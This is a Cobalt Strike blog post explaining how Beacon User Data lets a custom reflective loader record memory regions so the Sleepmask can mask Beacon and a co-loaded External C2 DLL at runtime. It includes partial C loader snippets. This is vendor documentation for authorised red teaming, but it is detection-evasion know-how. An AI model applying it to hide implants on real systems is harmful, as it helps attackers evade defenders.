# https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data

<!DOCTYPE html><html lang="en-US"><body class="wp-singular post-template-default single single-post postid-6252 single-format-standard wp-custom-logo wp-embed-responsive wp-theme-helpsystems wp-child-theme-cobalt-strike group-blog understrap-has-sidebar"><div id="consent_blackbar" lang="en">
            
            <div id="truste-consent-track" style="position: relative; z-index: 999999; border-top: 1px solid rgb(102, 102, 102);" class="ta-show ta-display-block">  <div id="truste-consent-content" style="overflow: hidden;">    <div id="truste-consent-text" class="truste-messageColumn" data-nosnippet="data-nosnippet">      <span class="hstitle">This website uses cookies. You may change your settings at any time.</span>    </div>    <div id="truste-consent-buttons" class="truste-buttonsColumn" data-nosnippet="data-nosnippet">      <span id="truste-repop-msg" style="padding: 7px 10px; background: #F9EDBE; border:1px solid #F0C36D; margin: 11px 0px 13px;font-size:11; line-height: 16px;color: #AF7501; display:none;"></span>       <button id="truste-consent-button">Accept</button>      <button id="truste-consent-required">Reject All</button>      <button id="truste-show-consent" aria-haspopup="dialog">Manage Cookies</button>    </div>  </div></div></div>
<div style="display:none;" id="teconsent" consent="undefined" aria-label="Open Cookie Preferences Modal" class="truste_caIcon_display" role="complementary"><a role="link" id="icon-id0988015138058935" tabindex="0" lang="en" aria-haspopup="dialog" aria-label="Cookie Preferences, opens a dedicated popup modal window" class="truste_cursor_pointer">Cookie Preferences</a></div>

	
<!-- TrustArc tag end -->
<!-- Google Tag Manager -->

<!-- End Google Tag Manager --><link rel="icon" href="https://www.cobaltstrike.com/app/uploads/2023/06/cropped-android-chrome-512x512-2-32x32.png" sizes="32x32">
<link rel="icon" href="https://www.cobaltstrike.com/app/uploads/2023/06/cropped-android-chrome-512x512-2-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://www.cobaltstrike.com/app/uploads/2023/06/cropped-android-chrome-512x512-2-180x180.png">

		
		


<!-- Google Tag Manager (noscript) -->

<!-- End Google Tag Manager (noscript) -->
<div class="site" id="page">

	<!-- ******************* The Navbar Area ******************* -->
	<!-- #wrapper-navbar -->

<div class="header-banner"> 
	<div class="jumbotron jumbotron-fluid bg-4 " style="background-image: ">
	<div class="banner-wrapper">
		<div class="container">
			<p class="yoast-breadcrumbs m-0"><span><span><a href="https://www.cobaltstrike.com/">Home</a></span> » <span><a href="https://www.cobaltstrike.com/blog/">Blog</a></span> » <span class="breadcrumb_last" aria-current="page">Revisiting the UDRL Part 3: Beacon User Data</span></span></p>							<h1>Revisiting the UDRL Part 3: Beacon User Data</h1>
								<p class="font-italic">Wednesday 04 September, 2024</p>

							</div>
	</div>
	</div>
</div>


<div class="wrapper" id="page-wrapper">

	<div class="container" id="content" tabindex="-1">
		<div class="row">
			<div class="col-lg-8 content-area" id="primary">

				<main class="site-main" id="main">
					<article class="post-6252 post type-post status-publish format-standard hentry product_line-cobalt-strike cornerstone-development cornerstone-red-team cta_type-blog" id="post-6252">


<div class="entry-content">
		
<p>The UDRL and the Sleepmask are key components of Cobalt Strike’s evasion strategy, yet historically they have not worked well together. For example, prior to <a href="https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate" target="_blank" rel="noreferrer noopener">CS 4.10</a>, Beacon statically calculated its location in memory using a combination of its base address and its section table. This calculation was then modified depending on the contents of the user’s malleable C2 profile and passed to the Sleepmask irrespective of the current loader (e.g. default vs UDRL). Therefore, if the UDRL’s loading strategy did not match the malleable C2 settings, the default Sleepmask would either crash or leave parts of Beacon unmasked and susceptible to static signatures.</p>



<p>In CS 4.10, we sought to improve the interface between UDRLs and the Sleepmask and decouple it from the malleable C2 profile. As a result, we updated Beacon User Data (BUD) to include information about memory allocated by the loader. This means Beacon can pass accurate section information to the Sleepmask, at runtime, which ensures that it is masked correctly and removes the need for static calculations/heuristics. In addition, it also makes it possible to track arbitrary memory allocations that can be used for things like BOFs/Sleepmasks/additional Postex capabilities.&nbsp;</p>



<p>The primary intention of this post is to demonstrate the UDRL’s role in runtime masking and show how Cobalt Strike’s two most important evasion tools interact. We will first demonstrate how to track Beacon with BUD. We will then load an External C2 DLL at the same time as Beacon and mask both DLLs at runtime with Sleepmask-VS. For simplicity, we will not cover <a href="https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm" target="_blank" rel="noreferrer noopener">masking the Sleepmask itself</a>.</p>



<p>To accompany this post, we have added the extc2-loader example to <a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development" target="_blank" rel="noreferrer noopener">UDRL-VS</a> and <code>ExternalC2Sleep()</code> to <a href="https://github.com/Cobalt-Strike/sleepmask-vs/" target="_blank" rel="noreferrer noopener">Sleepmask-VS</a>. It is therefore important to ensure that both tools are compiled and loaded into Cobalt Strike to utilize all the functionality described here.</p>



<p class="has-small-font-size"><strong><em>Note: </em></strong><em>UDRL-VS has been tested on Visual Studio Community version <code>17.11.2</code> and Windows 10 SDK <code>10.0.22000.0</code>. Please make sure to use the correct Windows 10 SDK as we have noticed some recent MSVC changes which can impact the project.</em></p>



<h2 class="wp-block-heading">Beacon User Data</h2>



<p>Beacon User Data (BUD) was originally introduced in <a href="https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader" target="_blank" rel="noreferrer noopener">CS 4.9</a> to create a mechanism to pass information between a UDRL and Beacon. Initially, it was intended to let users resolve their own syscall information to avoid using Beacon’s default methods of resolution. However, we see this feature becoming an essential part of UDRL development moving forward.</p>



<p>In CS 4.10, we updated BUD so that users could track the memory allocated by their UDRLs. This functionality was primarily introduced to:</p>



<ul class="wp-block-list">
<li>Ensure the Sleepmask has accurate information about the memory it needs to mask.&nbsp;</li>



<li>Support the cleanup of the allocated memory.&nbsp;</li>
</ul>



<p>To fulfill these requirements, BUD follows <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information" target="_blank" rel="noreferrer noopener">Microsoft’s abstractions</a> around virtual memory and tracks both the initial allocation to facilitate cleanup and any sections within it to support masking. We refer to these as “<em>regions</em>” and “<em>sections</em>” and use the following <code>ALLOCATED_MEMORY</code>, <code>ALLOCATED_MEMORY_REGION</code> and <code>ALLOCATED_MEMORY_SECTION</code> structures to define them.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_763500" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_763500_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_763500" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="keyword bold">typedef</code> <code class="keyword bold">struct</code> <code class="plain">_ALLOCATED_MEMORY_SECTION {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">ALLOCATED_MEMORY_LABEL Label;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">PVOID</code>&nbsp; <code class="plain">BaseAddress;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">SIZE_T</code> <code class="plain">VirtualSize; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code>&nbsp; <code class="plain">CurrentProtect;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code>&nbsp; <code class="plain">PreviousProtect;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">BOOL</code>&nbsp;&nbsp; <code class="plain">MaskSection; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="plain">} ALLOCATED_MEMORY_SECTION, *PALLOCATED_MEMORY_SECTION;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="keyword bold">typedef</code> <code class="keyword bold">struct</code> <code class="plain">_ALLOCATED_MEMORY_REGION {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">ALLOCATED_MEMORY_PURPOSE Purpose;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">PVOID</code>&nbsp; <code class="plain">AllocationBase; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">SIZE_T</code> <code class="plain">RegionSize; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code> <code class="plain">Type;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">ALLOCATED_MEMORY_SECTION Sections[8]; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="plain">} ALLOCATED_MEMORY_REGION, *PALLOCATED_MEMORY_REGION;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>18</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>19</code></td><td class="content"><code class="keyword bold">typedef</code> <code class="keyword bold">struct</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>20</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>21</code></td><td class="content"><code class="plain">} ALLOCATED_MEMORY, *PALLOCATED_MEMORY;</code></td></tr></tbody></table></div></div></div></div>


<p class="has-small-font-size"><em><strong>Note:</strong> The <code>ALLOCATED_MEMORY</code> structure encompasses six independent <code>ALLOCATED_MEMORY_REGION</code>s. These can then be broken down into eight individual <code>ALLOCATED_MEMORY_SECTION</code>s.</em></p>



<p>To simplify this approach to tracking memory, we have provided some helper functions in the UDRL-VS library. These functions abstract some of the details, but can easily be replaced with custom implementations as required.</p>



<ul class="wp-block-list">
<li><code>TrackAllocatedMemoryRegion()</code> – track an initial allocation of memory.</li>



<li><code>TrackAllocatedMemorySection()</code> – track a section within an existing region.</li>



<li><code>TrackAllocatedMemoryBuffer()</code> – a wrapper around <code>TrackAllocatedMemoryRegion()</code>&nbsp;and <code>TrackAllocatedMemorySection()</code>.</li>
</ul>



<p>In the following code example, we allocate a “<em>region</em>” of memory for the loaded Beacon (via <code>VirtualAlloc()</code>). We then initialize the relevant structures and use <code>TrackAllocatedMemoryRegion()</code> to save the information to BUD.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_180765" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_180765_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_180765" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="comments">// Initialize the relevant Beacon User Data structures </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="plain">USER_DATA userData;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="plain">ALLOCATED_MEMORY allocatedMemory;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="plain">_memset(&amp;userData, 0, </code><code class="keyword bold">sizeof</code><code class="plain">(USER_DATA));</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="plain">_memset(&amp;allocatedMemory, 0, </code><code class="keyword bold">sizeof</code><code class="plain">(ALLOCATED_MEMORY));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="plain">userData.allocatedMemory = &amp;allocatedMemory;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="plain">userData.version = COBALT_STRIKE_VERSION;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="comments">// Allocate region of memory for the loaded Beacon image </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="color1 bold">ULONG_PTR</code> <code class="plain">loadedDllBaseAddress = (</code><code class="color1 bold">ULONG_PTR</code><code class="plain">)winApi.VirtualAlloc(NULL, loadedImageSize, MEM_RESERVE | MEM_COMMIT, memoryProtection);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="comments">// Save the memory information in the first region entry&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="plain">TrackAllocatedMemoryRegion(&amp;userData.allocatedMemory-&gt;AllocatedMemoryRegions[0], PURPOSE_BEACON_MEMORY, (</code><code class="color1 bold">PVOID</code><code class="plain">)loadedDllBaseAddress, loadedImageSize, memoryType, &amp;cleanupMemoryInformation);</code></td></tr></tbody></table></div></div></div></div>


<p>It is also important to track each PE section independently as this information is required by the Sleepmask. To simplify this process, we have added the following <code>CopyPESectionsAndTrackMemory()</code> function to the UDRL-VS library. It is a slightly modified version of the existing <code>CopyPESections()</code> function, however, it uses <code>TrackAllocatedMemorySection()</code> to automatically save the section information.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_802541" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_802541_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_802541" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="color1 bold">BOOL</code> <code class="plain">CopyPESectionsAndTrackMemory(PALLOCATED_MEMORY_REGION allocatedMemoryRegion, </code><code class="color1 bold">ULONG_PTR</code> <code class="plain">srcImage, PIMAGE_NT_HEADERS ntHeader, </code><code class="color1 bold">ULONG_PTR</code> <code class="plain">dstAddress, </code><code class="color1 bold">DWORD</code> <code class="plain">memoryProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask, COPY_PEHEADER copyPeHeader) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PRINT(</code><code class="string">"[+] Copying Sections...\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">while</code> <code class="plain">(numberOfSections--) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// dstSection is the VA for this section</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">PBYTE</code> <code class="plain">dstSection = (</code><code class="color1 bold">PBYTE</code><code class="plain">)dstAddress + sectionHeader-&gt;VirtualAddress;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// srcSection is the VA for this sections data</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">PBYTE</code> <code class="plain">srcSection = (</code><code class="color1 bold">PBYTE</code><code class="plain">)srcImage + sectionHeader-&gt;PointerToRawData;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Copy the section over</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code> <code class="plain">sizeOfData = sectionHeader-&gt;SizeOfRawData;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(!_memcpy(dstSection, srcSection, sizeOfData)) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">FALSE;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>18</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>19</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Save the relevant information to the ALLOCATED_MEMORY_SECTION entry</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>20</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">TrackAllocatedMemorySection(&amp;allocatedMemoryRegion-&gt;Sections[sectionCount], GetSectionLabelFromName(sectionHeader-&gt;Name), dstSection, sectionHeader-&gt;Misc.VirtualSize, memoryProtections, mask);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>21</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>22</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PRINT(</code><code class="string">"\t[+] Copied Section: %s\n"</code><code class="plain">, sectionHeader-&gt;Name);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>23</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>24</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Get the VA of the next section</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>25</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">sectionHeader++;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>26</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">sectionCount++;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>27</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>28</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">TRUE;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>29</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div></div></div></div>


<p>To pass the completed <code>USER_DATA</code> structure to Beacon, we simply add an additional call to <code>DllMain()</code> to our loader with the <code>ul_reason_for_call</code> set to <code>DLL_BEACON_USER_DATA</code>.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_443458" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_443458_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_443458" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="plain">((DLLMAIN)entryPoint)(0, DLL_BEACON_USER_DATA, &amp;userData);</code></td></tr></tbody></table></div></div></div></div>


<p class="has-small-font-size"><strong><em>Note:</em></strong><em> Beacon copies this information locally so that the BUD structures do not need to remain in memory</em>.</p>



<p>And that’s it! Once Beacon is up and running, it will operate in the same fashion as before. However, when it is time to use the Sleepmask, it will have a much more accurate picture of the loaded Beacon image. The Sleepmask will then take the information in BUD and use it to apply runtime masking. </p>



<p>This approach allows users to create more generic masking capabilities that can automatically handle different memory layouts. For example, the obfuscation-loader uses a custom PE header which means the original is not present in the loaded image.&nbsp;Previously, this missing PE header would have required changing the Sleepmask code to avoid a crash. However, BUD makes it possible to record this information at load time.</p>



<h2 class="wp-block-heading">Case Study: BUD vs External C2</h2>



<p>Now that we have covered the basics, we can demonstrate how to use BUD to track an additional memory allocation. In the following sections, we will load an External C2 DLL at the same time as Beacon and mask them both at runtime with Sleepmask-VS.</p>



<p>Raphael Mudge <a href="https://www.cobaltstrike.com/blog/kits-profiles-and-scripts-oh-my" target="_blank" rel="noreferrer noopener">originally introduced External C2 in November 2016</a> to allow operators to create custom command and control channels. Whilst this feature was never announced as part of a release, there are several public projects that are <a href="https://www.outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/" target="_blank" rel="noreferrer noopener">built on top of External C2</a>, most notably <a href="https://labs.withsecure.com/tools/c3" target="_blank" rel="noreferrer noopener">C3</a>, which provides a complete framework for creating custom C2 channels.</p>



<p>At a high-level, External C2 is&nbsp;a specification that allows third-party programs to act as a communication layer for Cobalt Strike’s Beacon payload. In practice, this means using an SMB Beacon to communicate with a third-party client over a named pipe. The third-party client then communicates with a third-party controller, which interacts with Cobalt Strike’s External C2 server. This specification makes it possible to tunnel Beacon traffic over any service that allows you to read/write data.&nbsp;</p>



<p>As part of the original implementation, External C2 required the third-party controller to request a stage from the External C2 server before it could begin sending/receiving data. In addition, this stage was provided by the team server which meant that whilst the&nbsp;transformations in the malleable C2 profile were applied, it was not possible to use Aggressor Script to apply UDRLs/Sleepmasks/custom obfuscation and masking.</p>



<p>In CS 4.10, we added a “<em>pass thru</em>” mode to External C2 that allows the third-party controller to begin sending/receiving data immediately without requesting a stage. As a result, it is now possible to export an SMB Beacon from the CS client and use it in combination with a third-party client/controller to connect to the team server. This provides a higher degree of flexibility as it makes it possible to create a single payload file that contains both Beacon and an External C2 channel. In addition, it makes it possible to use Aggressor Script to transform the exported payload.</p>



<h3 class="wp-block-heading">Introducing extc2-loader</h3>



<p>We have added an extc2-loader example to UDRL-VS. In the extc2-loader folder there are two projects: the first is extc2-dll which ports Raphael’s <a href="https://hstechdocs.helpsystems.com/kbfiles/cobaltstrike/attachments/extc2example.c" target="_blank" rel="noreferrer noopener">original External C2 example</a> to a DLL and the second is the extc2-loader.</p>



<p>The extc2-loader is a simple reflective loader that abstracts most of its functionality into a separate function (<code>ExternalC2LoaderLoadDll()</code>) so it can be called multiple times to load each DLL. It is a Double Pulsar/sRDI style reflective loader which means that it is prepended in front of a single payload file. To ensure that the loader can easily identify the two DLLs, the extc2-loader’s <code>prepend-udrl.cna</code> creates a payload consisting of the loader, the size of Beacon, Beacon and the External C2 DLL.</p>


